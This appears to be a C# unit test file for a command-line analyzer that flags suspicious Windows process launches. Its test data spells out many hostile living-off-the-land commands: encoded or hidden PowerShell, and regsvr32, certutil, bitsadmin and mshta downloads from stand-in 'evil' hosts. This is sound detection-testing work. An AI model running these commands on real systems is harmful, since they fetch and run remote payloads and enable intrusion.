using Radar.Core.Analysis;

namespace Radar.Core.Tests;

public class CommandLineAnalyzerTests
{
    private static readonly CommandLineAnalyzer Analyzer = new();

    [Theory]
    [InlineData("powershell.exe", "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")]
    [InlineData("powershell.exe", "powershell -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://x/a')")]
    [InlineData("pwsh.exe", "pwsh -c \"Invoke-WebRequest http://evil/x -OutFile $env:TEMP\\x.exe\"")]
    [InlineData("regsvr32.exe", "regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll")]
    [InlineData("certutil.exe", "certutil -urlcache -split -f http://evil/payload.exe payload.exe")]
    [InlineData("mshta.exe", "mshta http://evil/calc.hta")]
    [InlineData("mshta.exe", "mshta javascript:a=GetObject(\"script:http://x\")")]
    [InlineData("bitsadmin.exe", "bitsadmin /transfer job http://evil/a.exe c:\\temp\\a.exe")]
    [InlineData("rundll32.exe", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"")]
    [InlineData("wscript.exe", "wscript.exe C:\\Users\\alice\\AppData\\Local\\Temp\\inv.vbs")]
    [InlineData("cmstp.exe", "cmstp.exe /s c:\\temp\\x.inf")]
    [InlineData("wmic.exe", "wmic process call create \"cmd /c whoami\"")]
    public void Anomalous_patterns_are_suspicious(string image, string commandLine)
    {
        var result = Analyzer.Analyze(image, commandLine);
        Assert.True(result.Suspicious, $"esperava suspeito: {commandLine}");
        Assert.NotEmpty(result.Summary);
    }

    [Theory]
    [InlineData("cmd.exe", "cmd /c dir C:\\")]
    [InlineData("powershell.exe", "powershell -File C:\\Scripts\\backup.ps1")]
    [InlineData("certutil.exe", "certutil -store My")]
    [InlineData("regsvr32.exe", "regsvr32 /s C:\\Program Files\\App\\component.dll")]
    [InlineData("notepad.exe", "notepad C:\\notes.txt")]
    [InlineData("wscript.exe", "wscript.exe C:\\Program Files\\Vendor\\setup.vbs")]
    public void Normal_usage_is_not_suspicious(string image, string? commandLine)
    {
        Assert.False(Analyzer.Analyze(image, commandLine).Suspicious,
            $"falso positivo: {commandLine}");
    }

    [Fact]
    public void Empty_command_line_is_not_suspicious() =>
        Assert.False(Analyzer.Analyze("powershell.exe", null).Suspicious);

    [Fact]
    public void Long_base64_block_is_flagged_even_outside_shell()
    {
        var blob = new string('A', 200);
        Assert.True(Analyzer.Analyze("someapp.exe", $"someapp --data {blob}==").Suspicious);
    }

    [Fact]
    public void Lolbin_lookup_uses_curated_list()
    {
        Assert.True(Analyzer.IsLolBin(@"C:\Windows\System32\certutil.exe"));
        Assert.False(Analyzer.IsLolBin(@"C:\Windows\System32\notepad.exe"));
    }
}
